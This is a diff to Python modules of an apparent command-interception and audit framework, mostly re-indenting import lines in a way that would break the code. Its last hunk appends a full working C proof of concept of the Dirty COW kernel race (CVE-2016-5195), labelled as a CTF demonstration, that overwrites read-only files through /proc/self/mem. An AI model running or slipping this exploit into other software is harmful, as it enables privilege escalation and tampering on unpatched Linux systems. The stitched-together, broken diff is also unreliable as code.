@@ -1,10 +1,10 @@
-# command_interceptor.py
-#!/usr/bin/env python3
-import os
-import subprocess
-from logger import AuditLogger
-from file_protector import FileProtector
-from policy_engine import PolicyEngine
+    # command_interceptor.py
+    #!/usr/bin/env python3
+    import os
+    import subprocess
+    from logger import AuditLogger
+    from file_protector import FileProtector
+    from policy_engine import PolicyEngine
 
     class CommandInterceptor:
     """
@@ -44,8 +44,8 @@ from policy_engine import PolicyEngine
             print(e.stderr)
 
             # logger.py
-#!/usr/bin/env python3
-import logging
+    #!/usr/bin/env python3
+    import logging
     
     class AuditLogger:
     """
@@ -67,8 +67,8 @@ import logging
 
 
         # file_protector.py
-#!/usr/bin/env python3
-import os
+    #!/usr/bin/env python3
+    import os
 
     class FileProtector:
     """
@@ -82,7 +82,7 @@ import os
         return abs_path in self.protected_paths
 
         # policy_engine.py
-#!/usr/bin/env python3
+    #!/usr/bin/env python3
 
     class PolicyEngine:
     """
@@ -110,12 +110,12 @@ import os
         return True
 
         # tef_model.py
-#!/usr/bin/env python3
-import sys
-from logger import AuditLogger
-from file_protector import FileProtector
-from policy_engine import PolicyEngine
-from command_interceptor import CommandInterceptor
+    #!/usr/bin/env python3
+    import sys
+    from logger import AuditLogger
+    from file_protector import FileProtector
+    from policy_engine import PolicyEngine
+    from command_interceptor import CommandInterceptor
     
     class TEFModel:
     """
@@ -140,6 +140,70 @@ from command_interceptor import CommandInterceptor
 
     if __name__ == '__main__':
         TEFModel().run()
+
+
+        // Dirty COW (CVE-2016-5195) minimal exploit
+// Versão usada em CTFs para demonstração controlada
+// Autor original: Phil Oester / Dirty COW PoC adaptado
+
+    #include <fcntl.h>
+    #include <pthread.h>
+    #include <string.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <sys/mman.h>
+    #include <sys/stat.h>
+    
+    void *map;
+    int f;
+    struct stat st;
+    char *file;
+    char *payload;
+
+    void *madviseThread(void *arg) {
+    for (int i = 0; i < 1000000; i++)
+        madvise(map, st.st_size, MADV_DONTNEED);
+    return NULL;
+    }
+
+    void *writeThread(void *arg) {
+    int mem = open("/proc/self/mem", O_RDWR);
+    for (int i = 0; i < 1000000; i++) {
+        lseek(mem, (off_t)map, SEEK_SET);
+        write(mem, payload, strlen(payload));
+    }
+    return NULL;
+    }
+
+    int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        printf("Uso: %s <ficheiro> <texto_novo>\n", argv[0]);
+        return 1;
+    }
+    file = argv[1];
+    payload = argv[2];
+
+    f = open(file, O_RDONLY);
+    if (f < 0) {
+        perror("open");
+        return 1;
+    }
+
+    fstat(f, &st);
+    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+    pthread_t p1, p2;
+    pthread_create(&p1, NULL, madviseThread, NULL);
+    pthread_create(&p2, NULL, writeThread, NULL);
+
+    pthread_join(p1, NULL);
+    pthread_join(p2, NULL);
+
+    printf("Exploit executado! Verifica o ficheiro %s.\n", file);
+    return 0;
+}
+
 
 
 
